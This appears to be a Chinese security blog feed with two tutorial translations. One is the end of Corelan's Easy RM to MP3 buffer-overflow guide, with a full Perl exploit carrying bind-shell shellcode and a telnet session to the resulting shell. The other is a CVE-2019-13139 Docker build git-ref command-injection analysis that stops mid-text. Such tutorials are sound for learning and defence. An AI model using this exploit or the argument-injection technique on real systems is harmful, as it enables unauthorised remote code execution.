class="line">&quot;\x4f\x43\x50\x4c\x4b\x42\x4c\x51\x34\x51\x34\x4c\x4b\x47&quot; .</span><br><span class="line">&quot;\x35\x47\x4c\x4c\x4b\x43\x4c\x44\x45\x44\x38\x45\x51\x4a&quot; .</span><br><span class="line">&quot;\x4f\x4c\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x51\x30\x43&quot; .</span><br><span class="line">&quot;\x31\x4a\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a&quot; .</span><br><span class="line">&quot;\x4e\x46\x51\x49\x50\x4a\x39\x4e\x4c\x4d\x54\x49\x50\x44&quot; .</span><br><span class="line">&quot;\x34\x45\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a&quot; .</span><br><span class="line">&quot;\x4b\x4a\x54\x47\x4b\x51\x44\x51\x34\x47\x58\x44\x35\x4a&quot; .</span><br><span class="line">&quot;\x45\x4c\x4b\x51\x4f\x47\x54\x43\x31\x4a\x4b\x45\x36\x4c&quot; .</span><br><span class="line">&quot;\x4b\x44\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a&quot; .</span><br><span class="line">&quot;\x4b\x44\x43\x46\x4c\x4c\x4b\x4d\x59\x42\x4c\x46\x44\x45&quot; .</span><br><span class="line">&quot;\x4c\x43\x51\x48\x43\x46\x51\x49\x4b\x45\x34\x4c\x4b\x50&quot; .</span><br><span class="line">&quot;\x43\x50\x30\x4c\x4b\x51\x50\x44\x4c\x4c\x4b\x42\x50\x45&quot; .</span><br><span class="line">&quot;\x4c\x4e\x4d\x4c\x4b\x51\x50\x45\x58\x51\x4e\x43\x58\x4c&quot; .</span><br><span class="line">&quot;\x4e\x50\x4e\x44\x4e\x4a\x4c\x50\x50\x4b\x4f\x48\x56\x43&quot; .</span><br><span class="line">&quot;\x56\x50\x53\x45\x36\x45\x38\x50\x33\x50\x32\x42\x48\x43&quot; .</span><br><span class="line">&lt;...&gt;</span><br><span class="line">&quot;\x50\x41\x41&quot;;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;让我们使用这个新的 shellcode，新的 exploit 应该是这样的：附注：我手动破坏了这里显示的 shellcode。因此如果你复制和粘贴，它将不会有效。但你现在应该知道如何构造一个有效的 exploit。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Exploit for Easy RM to MP3 27.3.700 vulnerability, discovered by Crazy_Hacker</span></span><br><span class="line"><span class="comment"># Written by Peter Van Eeckhoutte</span></span><br><span class="line"><span class="comment"># http://www.corelan.be</span></span><br><span class="line"><span class="comment"># Greetings to Saumil and SK :-)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># tested on Windows XP SP3 (En)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">my</span> $file= <span class="string">"exploitrmtomp3.m3u"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $junk= <span class="string">"A"</span> <span class="keyword">x</span> <span class="number">26094</span>;</span><br><span class="line"><span class="keyword">my</span> $eip = <span class="keyword">pack</span>(<span class="string">'V'</span>,<span class="number">0x01ccf23a</span>);  <span class="comment">#jmp esp from MSRMCcodec02.dll</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $shellcode = <span class="string">"\x90"</span> <span class="keyword">x</span> <span class="number">25</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># windows/shell_bind_tcp - 703 bytes</span></span><br><span class="line"><span class="comment"># http://www.metasploit.com</span></span><br><span class="line"><span class="comment"># Encoder: x86/alpha_upper</span></span><br><span class="line"><span class="comment"># EXITFUNC=seh, LPORT=4444, RHOST=</span></span><br><span class="line">$shellcode=$shellcode.<span class="string">"\x89\xe1\xdb\xd4\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49"</span> .</span><br><span class="line"><span class="string">"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"</span> .</span><br><span class="line"><span class="string">"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"</span> .</span><br><span class="line"><span class="string">"\x42\x41\x41\x42\x54\x00\x41\x51\x32\x41\x42\x32\x42\x42"</span> .</span><br><span class="line"><span class="string">"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x42"</span> .</span><br><span class="line"><span class="string">"\x4a\x4a\x4b\x50\x4d\x4b\x58\x4c\x39\x4b\x4f\x4b\x4f\x4b"</span> .</span><br><span class="line"><span class="string">"\x4f\x43\x50\x4c\x4b\x42\x4c\x51\x34\x51\x34\x4c\x4b\x47"</span> .</span><br><span class="line"><span class="string">"\x35\x47\x4c\x4c\x4b\x43\x4c\x44\x45\x44\x38\x45\x51\x4a"</span> .</span><br><span class="line"><span class="string">"\x4f\x4c\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x51\x30\x43"</span> .</span><br><span class="line"><span class="string">"\x31\x4a\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a"</span> .</span><br><span class="line"><span class="string">"\x4e\x46\x51\x49\x50\x4a\x39\x4e\x4c\x4d\x54\x49\x50\x44"</span> .</span><br><span class="line"><span class="string">"\x34\x45\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a"</span> .</span><br><span class="line"><span class="string">"\x4b\x4a\x54\x47\x4b\x51\x44\x51\x34\x47\x58\x44\x35\x4a"</span> .</span><br><span class="line"><span class="string">"\x45\x4c\x4b\x51\x4f\x47\x54\x43\x31\x4a\x4b\x45\x36\x4c"</span> .</span><br><span class="line"><span class="string">"\x4b\x44\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a"</span> .</span><br><span class="line"><span class="string">"\x4b\x44\x43\x46\x4c\x4c\x4b\x4d\x59\x42\x4c\x46\x44\x45"</span> .</span><br><span class="line"><span class="string">"\x4c\x43\x51\x48\x43\x46\x51\x49\x4b\x45\x34\x4c\x4b\x50"</span> .</span><br><span class="line"><span class="string">"\x43\x50\x30\x4c\x4b\x51\x50\x44\x4c\x4c\x4b\x42\x50\x45"</span> .</span><br><span class="line"><span class="string">"\x4c\x4e\x4d\x4c\x4b\x51\x50\x45\x58\x51\x4e\x43\x58\x4c"</span> .</span><br><span class="line"><span class="string">"\x4e\x50\x4e\x44\x4e\x4a\x4c\x50\x50\x4b\x4f\x48\x56\x43"</span> .</span><br><span class="line"><span class="string">"\x56\x50\x53\x45\x36\x45\x38\x50\x33\x50\x32\x42\x48\x43"</span> .</span><br><span class="line"><span class="string">"\x47\x43\x43\x47\x42\x51\x4f\x50\x54\x4b\x4f\x48\x50\x42"</span> .</span><br><span class="line"><span class="string">"\x48\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x50\x50\x4b\x4f\x48"</span> .</span><br><span class="line"><span class="string">"\x56\x51\x4f\x4d\x59\x4d\x35\x45\x36\x4b\x31\x4a\x4d\x43"</span> .</span><br><span class="line"><span class="string">"\x38\x43\x32\x46\x35\x43\x5a\x44\x42\x4b\x4f\x4e\x30\x42"</span> .</span><br><span class="line"><span class="string">"\x48\x48\x59\x45\x59\x4c\x35\x4e\x4d\x50\x57\x4b\x4f\x48"</span> .</span><br><span class="line"><span class="string">"\x56\x46\x33\x46\x33\x46\x33\x50\x53\x50\x53\x50\x43\x51"</span> .</span><br><span class="line"><span class="string">"\x43\x51\x53\x46\x33\x4b\x4f\x4e\x30\x43\x56\x45\x38\x42"</span> .</span><br><span class="line"><span class="string">"\x31\x51\x4c\x42\x46\x46\x33\x4c\x49\x4d\x31\x4a\x35\x42"</span> .</span><br><span class="line"><span class="string">"\x48\x4e\x44\x44\x5a\x44\x30\x49\x57\x50\x57\x4b\x4f\x48"</span> .</span><br><span class="line"><span class="string">"\x56\x43\x5a\x44\x50\x50\x51\x51\x45\x4b\x4f\x4e\x30\x43"</span> .</span><br><span class="line"><span class="string">"\x58\x49\x34\x4e\x4d\x46\x4e\x4b\x59\x50\x57\x4b\x4f\x4e"</span> .</span><br><span class="line"><span class="string">"\x36\x50\x53\x46\x35\x4b\x4f\x4e\x30\x42\x48\x4d\x35\x50"</span> .</span><br><span class="line"><span class="string">"\x49\x4d\x56\x50\x49\x51\x47\x4b\x4f\x48\x56\x50\x50\x50"</span> .</span><br><span class="line"><span class="string">"\x54\x50\x54\x46\x35\x4b\x4f\x48\x50\x4a\x33\x45\x38\x4a"</span> .</span><br><span class="line"><span class="string">"\x47\x44\x39\x48\x46\x43\x49\x50\x57\x4b\x4f\x48\x56\x50"</span> .</span><br><span class="line"><span class="string">"\x55\x4b\x4f\x48\x50\x42\x46\x42\x4a\x42\x44\x45\x36\x45"</span> .</span><br><span class="line"><span class="string">"\x38\x45\x33\x42\x4d\x4d\x59\x4b\x55\x42\x4a\x46\x30\x50"</span> .</span><br><span class="line"><span class="string">"\x59\x47\x59\x48\x4c\x4b\x39\x4a\x47\x43\x5a\x50\x44\x4b"</span> .</span><br><span class="line"><span class="string">"\x39\x4b\x52\x46\x51\x49\x50\x4c\x33\x4e\x4a\x4b\x4e\x47"</span> .</span><br><span class="line"><span class="string">"\x32\x46\x4d\x4b\x4e\x51\x52\x46\x4c\x4d\x43\x4c\x4d\x42"</span> .</span><br><span class="line"><span class="string">"\x5a\x50\x38\x4e\x4b\x4e\x4b\x4e\x4b\x43\x58\x42\x52\x4b"</span> .</span><br><span class="line"><span class="string">"\x4e\x4e\x53\x42\x36\x4b\x4f\x43\x45\x51\x54\x4b\x4f\x49"</span> .</span><br><span class="line"><span class="string">"\x46\x51\x4b\x46\x37\x46\x32\x50\x51\x50\x51\x46\x31\x42"</span> .</span><br><span class="line"><span class="string">"\x4a\x45\x51\x46\x31\x46\x31\x51\x45\x50\x51\x4b\x4f\x48"</span> .</span><br><span class="line"><span class="string">"\x50\x43\x58\x4e\x4d\x4e\x39\x45\x55\x48\x4e\x51\x43\x4b"</span> .</span><br><span class="line"><span class="string">"\x4f\x49\x46\x43\x5a\x4b\x4f\x4b\x4f\x47\x47\x4b\x4f\x48"</span> .</span><br><span class="line"><span class="string">"\x50\x4c\x4b\x46\x37\x4b\x4c\x4c\x43\x49\x54\x45\x34\x4b"</span> .</span><br><span class="line"><span class="string">"\x4f\x4e\x36\x50\x52\x4b\x4f\x48\x50\x43\x58\x4c\x30\x4c"</span> .</span><br><span class="line"><span class="string">"\x4a\x44\x44\x51\x4f\x46\x33\x4b\x4f\x48\x56\x4b\x4f\x48"</span> .</span><br><span class="line"><span class="string">"\x50\x41\x41"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">open</span>($FILE,<span class="string">"&gt;$file"</span>);</span><br><span class="line"><span class="keyword">print</span> $FILE $junk.$eip.$shellcode;</span><br><span class="line"><span class="keyword">close</span>($FILE);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m3u File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;创建这个 m3u文件，在程序中打开它。看起来现在 Easy RM to MP3 暂停了：</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2009/07/image_thumb16.png" alt="image" title class>
                <p>image</p>
            </figure>

<p>&emsp;&emsp;Telnet 连接这个机器的 4444端口：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@bt:/# telnet 192.168.0.197 4444</span><br><span class="line">Trying 192.168.0.197...</span><br><span class="line">Connected to 192.168.0.197.</span><br><span class="line">Escape character is &apos;^]&apos;.</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\Program Files\Easy RM to MP3 Converter&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;完成！</p>
<p>&emsp;&emsp;现在去构造你自己的 exploit 吧！</p>
<hr>
<p>&emsp;&emsp;第一篇的内容就到这里了，虽然是 9年前的内容，但里面的很多东西到现在也在使用，值得我们多多学习。这篇的内容极其适合需要考 OSCP 的同学， 但是根据作者的内容练手不是特别方便，大家可以百度或谷歌 windwos SLmail缓冲区溢出 的文章来练手学习，只需要 python 等简单的环境。</p>
<p>&emsp;&emsp;关于文章的更新：作者写了十多篇教程，我会逐渐更新下去，对我也是一种学习，但是时间的话就有点随缘了，最近手上的坑很多，慢慢填吧。</p>
]]></content>
      
        <categories>
            
            <category> Translation </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Exploit编写 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2019-13139 - Docker build 命令执行]]></title>
      <url>/2019/07/27/CVE-2019-13139%20-%20Docker%20build%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      <content type="html"><![CDATA[<blockquote>
<p>Url: <a href="https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/" target="_blank" rel="noopener">https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/</a></p>
</blockquote>
<blockquote>
<p>Author: staaldraad</p>
</blockquote>
<blockquote>
<p>translator: B1ngDa0    </p>
</blockquote>
<hr>
<p>第一次正式翻译技术文档，虽是英语专业的万能吊车尾，还是想发挥自身可用的资源进行输出。翻译对我是一种技术以及英语的方式，如大佬有什么好的建议或意见请告知我私信或邮件：captainzhougai#foxmail.com</p>
<hr>
<h1 id="CVE-2019-13139-Docker-build-命令执行"><a href="#CVE-2019-13139-Docker-build-命令执行" class="headerlink" title="CVE-2019-13139 - Docker build 命令执行"></a>CVE-2019-13139 - Docker build 命令执行</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2019年7月16日</p>
<p>今年早些的时候，为了我在 <strong>Troopers 2019</strong> 的演讲做了一些研究，我审查了 build 系统以及 <strong>git</strong> 如何导致安全问题，我在 Docker 中发现了一个与 <strong>git</strong> 相关的漏洞。这个漏洞已经被分配编号 CVE-2019-13139 并且已经在 Docker engine <strong>18.09.4</strong> 的更新中被修补。<br><br><br>这个问题是比较直接的命令注入，但是，它发生在 GO 代码库中可能使它更意思一些。基本上认为 Go 的 os/exec 程序包不会遭受命令注入的影响，基本上是这样的但是就像其他“安全”的命令执行接口，比如 Python 的 subprocess，仍然有看起来安全的代码导致了命令注入的少数情况。</p>
<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>十分容易的发现了这个漏洞。我想知道哪个流行的工具依赖(或者花了钱在) <strong>git</strong> 以及容易受到 <strong>CVE-2018-11235</strong> 的攻击作为我演讲的一部分。Docker build 提供了提供远程链接做为构建路径/环境的选项，并且这个远程链接可以是一个 <strong>git 存储库</strong>。我在看说明书首先注意到的事是<br><br></p>
<blockquote>
<p>注意：如果这个链接的参数包含一个片段，系统将会使用 <strong>git clone –recursive</strong> 命令以递归的方式克隆该存储库及其子模块</p>
</blockquote>
<br>
我也在下面的视频中清楚地演示了 Docker 是容易受到CVE-2018-11235 的攻击：
<br>

<blockquote>
<p><a href="https://twitter.com/_staaldraad/status/1040315186081669120?s=20`" target="_blank" rel="noopener">https://twitter.com/_staaldraad/status/1040315186081669120?s=20`</a></p>
</blockquote>
<br>
突出的第二件事是，有多个选择来提供远程 git 存储库的链接，并且很有可能提供要使用的分支和目录：
<br>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker build https://github.com/docker/rootfs.git#container:docker</span><br><span class="line"></span><br><span class="line">$ docker build git@github.com:docker/rootfs.git#container:docker</span><br><span class="line"></span><br><span class="line">$ docker build git://github.com/docker/rootfs.git#container:docker</span><br></pre></td></tr></table></figure>

<br>
在上面这个例子中，所有链接都引用 Github 上的远程存储库，并且使用 **container** 分支以及 **docker** 目录作为 build 的环境。这让我想知道这个机制背后的代码，我查看了**源代码**。
<br>

<p>查看下方的代码，首先发生的事是远程链接被解析并被转换为 gitRepo 结构，然后提取 fetch 参数。以 root 身份创建一个临时的目录，在这个临时的目录中创建了一个新的 git 存储库，并设置此存储库的远程。远程被“获取”，检验了存储库并且最终子模块被初始化。<br><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">func Clone(remoteURL string) (string, error) &#123;</span><br><span class="line">	repo, err := parseRemoteURL(remoteURL)</span><br><span class="line"></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return &quot;&quot;, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return cloneGitRepo(repo)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func cloneGitRepo(repo gitRepo) (checkoutDir string, err error) &#123;</span><br><span class="line">	fetch := fetchArgs(repo.remote, repo.ref)</span><br><span class="line"></span><br><span class="line">	root, err := ioutil.TempDir(&quot;&quot;, &quot;docker-build-git&quot;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return &quot;&quot;, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	defer func() &#123;</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			os.RemoveAll(root)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	if out, err := gitWithinDir(root, &quot;init&quot;); err != nil &#123;</span><br><span class="line">		return &quot;&quot;, errors.Wrapf(err, &quot;failed to init repo at %s: %s&quot;, root, out)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Add origin remote for compatibility with previous implementation that</span><br><span class="line">	// used &quot;git clone&quot; and also to make sure local refs are created for branches</span><br><span class="line">	if out, err := gitWithinDir(root, &quot;remote&quot;, &quot;add&quot;, &quot;origin&quot;, repo.remote); err != nil &#123;</span><br><span class="line">		return &quot;&quot;, errors.Wrapf(err, &quot;failed add origin repo at %s: %s&quot;, repo.remote, out)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if output, err := gitWithinDir(root, fetch...); err != nil &#123;</span><br><span class="line">		return &quot;&quot;, errors.Wrapf(err, &quot;error fetching: %s&quot;, output)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	checkoutDir, err = checkoutGit(root, repo.ref, repo.subdir)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return &quot;&quot;, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cmd := exec.Command(&quot;git&quot;, &quot;submodule&quot;, &quot;update&quot;, &quot;--init&quot;, &quot;--recursive&quot;, &quot;--depth=1&quot;)</span><br><span class="line">	cmd.Dir = root</span><br><span class="line">	output, err := cmd.CombinedOutput()</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return &quot;&quot;, errors.Wrapf(err, &quot;error initializing submodules: %s&quot;, output)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return checkoutDir, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>
这时还没有明显的问题。所有 git 命令通过 gitWithDir 函数执行。跟进这个函数，一切开始变得有趣起来。
<br>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">func gitWithinDir(dir string, args ...string) ([]byte, error) &#123;</span><br><span class="line">	a := []string&#123;&quot;--work-tree&quot;, dir, &quot;--git-dir&quot;, filepath.Join(dir, &quot;.git&quot;)&#125;</span><br><span class="line">	return git(append(a, args...)...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func git(args ...string) ([]byte, error) &#123;</span><br><span class="line">	return exec.Command(&quot;git&quot;, args...).CombinedOutput()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>
exec.Command() 函数采取了硬编码的“二进制”，“git”，作为第一个参数，剩下的参数可以是空或者多个字符串。这里没有直接导致命令执行，因为参数都是转义了的并且 shell 注入在 os/exec 包中不起作用。
<br>

<p>通过 exec.Command() 执行的命令没有受到命令注入的保护。如果传递给 git 二进制文件的一个或多个参数在 git 中作子命令，则仍可能造成命令注入。这正是 @joernchen 在 CVE-2018-17456 中利用的，通过注入 -u./payload 的路径在 Git 子模块中执行命令，其中 -u 告诉 git 使用哪一个二进制文件用于 upload-pack 命令。如果可以将类似的 payload 传递给 Docker build 命令，则可能造成命令注入。<br><br></p>
<p>回到 Docker 源代码的审计上，在查看 parseRemoteURL 函数时，可以看到它根据链接拆分被提供的链接。<br><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">func parseRemoteURL(remoteURL string) (gitRepo, error) &#123;</span><br><span class="line">	repo := gitRepo&#123;&#125;</span><br><span class="line"></span><br><span class="line">	if !isGitTransport(remoteURL) &#123;</span><br><span class="line">		remoteURL = &quot;https://&quot; + remoteURL</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	var fragment string</span><br><span class="line">	if strings.HasPrefix(remoteURL, &quot;git@&quot;) &#123;</span><br><span class="line">		// git@.. is not an URL, so cannot be parsed as URL</span><br><span class="line">		parts := strings.SplitN(remoteURL, &quot;#&quot;, 2)</span><br><span class="line"></span><br><span class="line">		repo.remote = parts[0]</span><br><span class="line">		if len(parts) == 2 &#123;</span><br><span class="line">			fragment = parts[1]</span><br><span class="line">		&#125;</span><br><span class="line">		repo.ref, repo.subdir = getRefAndSubdir(fragment)</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		u, err := url.Parse(remoteURL)</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			return repo, err</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		repo.ref, repo.subdir = getRefAndSubdir(u.Fragment)</span><br><span class="line">		u.Fragment = &quot;&quot;</span><br><span class="line">		repo.remote = u.String()</span><br><span class="line">	&#125;</span><br><span class="line">	return repo, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func getRefAndSubdir(fragment string) (ref string, subdir string) &#123;</span><br><span class="line">	refAndDir := strings.SplitN(fragment, &quot;:&quot;, 2)</span><br><span class="line">	ref = &quot;master&quot;</span><br><span class="line">	if len(refAndDir[0]) != 0 &#123;</span><br><span class="line">		ref = refAndDir[0]</span><br><span class="line">	&#125;</span><br><span class="line">	if len(refAndDir) &gt; 1 &amp;&amp; len(refAndDir[1]) != 0 &#123;</span><br><span class="line">		subdir = refAndDir[1]</span><br><span class="line">	&#125;</span><br><span class="line">	return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>
而 repo.ref 以及 repo.subdir 很容易被我们控制。getRefAndSubdir 函数使用":"作为分隔符将被提供的字符串拆分为两部分，然后将这些值传给 fetchArgs 函数；
<br>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">func fetchArgs(remoteURL string, ref string) []string &#123;</span><br><span class="line">	args := []string&#123;&quot;fetch&quot;&#125;</span><br><span class="line"></span><br><span class="line">	if supportsShallowClone(remoteURL) &#123;</span><br><span class="line">		args = append(args, &quot;--depth&quot;, &quot;1&quot;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return append(args, &quot;origin&quot;, ref)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>
你能发现了这个问题吗？ref 字符串附加到 fetch 命令的参数列表中，没有任何验证确保它是一个有效的具体的引用(注：refspec=Reference Specification)。这意味着如果可以通过类似 -u./payload 的引用，那么它将作为参数传递给 git fetch 命令。
<br>

<p>最后通过 git fetch 命令执行<br><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if output, err := gitWithinDir(root, fetch...); err != nil &#123;</span><br><span class="line">		return &quot;&quot;, errors.Wrapf(err, &quot;error fetching: %s&quot;, output)</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><br>
通过上面的内容知道，需要使用 ref 来注入最终的 git fetch 命令。ref 来自 #container:docker 字符串，用于提供 Docker 环境的分支以及文件夹。因为 strings.splitN() 函数使用了":"拆分了，所以"#"和":"之间的所有东西将被用于 ref 。另外的好消息是因为 os/exec 包将每一个字符串视为要传递给 execv 的参数，如果提供的字符串包含一个空格，则将视为引用了它。因此 #echo 1:two 将造成在最终的命令中执行 git fetch origin "echo 1"。不是太有帮助，但已经成功了一半。
 <br>

<p>接下来将识别传递进 git fetch 的一个或多个参数是否被当作子命令。为此需要查看提供的 git-fetch 文档：<a href="https://git-scm.com/docs/git-fetch。事实证明，有一个理想的" target="_blank" rel="noopener">https://git-scm.com/docs/git-fetch。事实证明，有一个理想的</a> upload-pack 选项：<br><br></p>
<blockquote>
<p>当给予 –upload-pack <upload-pack>，并且获取的存储库通过 git fetch-pack执行时，–exec=<upload-pack> 将传递给命令在另一端以指定命令的非默认路径执行。</upload-pack></upload-pack></p>
</blockquote>
<br>
